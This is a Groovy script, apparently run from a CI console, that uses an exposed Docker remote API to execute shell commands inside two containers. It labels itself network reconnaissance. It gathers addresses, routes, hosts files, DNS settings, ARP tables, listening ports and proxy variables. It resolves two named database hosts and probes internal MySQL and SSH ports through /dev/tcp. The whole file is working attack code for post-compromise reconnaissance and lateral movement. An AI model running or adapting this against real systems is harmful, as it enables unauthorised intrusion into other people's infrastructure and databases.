import groovy.json.JsonSlurper
import groovy.json.JsonOutput

def DOCKER_API = "http://172.27.140.148:4243"
def containers = ["5b32e909c295", "3b389d5bf116"]

def httpGet(url) {
    try {
        def conn = new URL(url).openConnection()
        conn.connectTimeout = 5000
        conn.readTimeout = 10000
        return conn.inputStream.text
    } catch (e) {
        return """{"error":"${e.message}"}"""
    }
}

def httpPost(url, body) {
    try {
        def conn = new URL(url).openConnection()
        conn.requestMethod = 'POST'
        conn.doOutput = true
        conn.setRequestProperty('Content-Type', 'application/json')
        conn.connectTimeout = 5000
        conn.readTimeout = 15000
        conn.outputStream.write(body.getBytes('UTF-8'))
        return conn.inputStream.text
    } catch (e) {
        try { return conn.errorStream?.text ?: """{"error":"${e.message}"}""" }
        catch (e2) { return """{"error":"${e.message}"}""" }
    }
}

def dockerExec(containerId, cmd) {
    def createBody = JsonOutput.toJson([
        AttachStdout: true,
        AttachStderr: true,
        Cmd: ['sh', '-c', cmd]
    ])
    def createResp = httpPost("${DOCKER_API}/containers/${containerId}/exec", createBody)
    def js = new JsonSlurper()
    def execId = js.parseText(createResp)?.Id
    if (!execId) return "EXEC_CREATE_FAILED: ${createResp}"
    
    def startBody = JsonOutput.toJson([Detach: false, Tty: false])
    def output = httpPost("${DOCKER_API}/exec/${execId}/start", startBody)
    return output?.replaceAll('[\\x00-\\x08]', '')?.trim() ?: "EMPTY"
}

println "=== DOCKER CONTAINERS NETWORK RECON ==="
println "=== Docker API: ${DOCKER_API} ==="
println ""

containers.each { cid ->
    println "=========================================="
    println "CONTAINER: ${cid}"
    println "=========================================="
    
    println "--- hostname ---"
    println dockerExec(cid, "hostname")
    println ""
    
    println "--- ip addr ---"
    println dockerExec(cid, "ip addr show 2>/dev/null || ifconfig 2>/dev/null || cat /proc/net/if_inet6 2>/dev/null && cat /proc/net/fib_trie 2>/dev/null | head -50")
    println ""
    
    println "--- ip route ---"
    println dockerExec(cid, "ip route show 2>/dev/null || route -n 2>/dev/null || cat /proc/net/route")
    println ""
    
    println "--- /etc/hosts ---"
    println dockerExec(cid, "cat /etc/hosts")
    println ""
    
    println "--- /etc/resolv.conf ---"
    println dockerExec(cid, "cat /etc/resolv.conf")
    println ""
    
    println "--- arp / neighbors ---"
    println dockerExec(cid, "arp -a 2>/dev/null || ip neigh show 2>/dev/null || cat /proc/net/arp")
    println ""
    
    println "--- listening ports ---"
    println dockerExec(cid, "ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null || cat /proc/net/tcp")
    println ""
    
    println "--- env proxy ---"
    println dockerExec(cid, "env | grep -i proxy || echo NO_PROXY")
    println ""
    
    println "--- DNS resolve targets ---"
    println dockerExec(cid, "nslookup dbasears.mrc-services.io 2>/dev/null || getent hosts dbasears.mrc-services.io 2>/dev/null || echo NO_DNS")
    println dockerExec(cid, "nslookup appdb.claroshop-services.net 2>/dev/null || getent hosts appdb.claroshop-services.net 2>/dev/null || echo NO_DNS")
    println ""
    
    println "--- tcp probe key hosts ---"
    def probeTargets = [
        "172.27.141.24:3308", "172.27.141.4:3310", "172.27.141.21:8080",
        "172.27.141.24:22", "172.27.141.4:22", "172.27.140.148:4243",
        "172.27.141.1:22", "172.27.141.24:3306", "172.27.141.4:3306"
    ]
    probeTargets.each { target ->
        def (ip, port) = target.split(':')
        def r = dockerExec(cid, "timeout 2 bash -c 'echo > /dev/tcp/${ip}/${port}' 2>/dev/null && echo 'OPEN ${target}' || echo 'CLOSED ${target}'")
        println r
    }
    println ""
}

println "=== END DOCKER RECON ==="
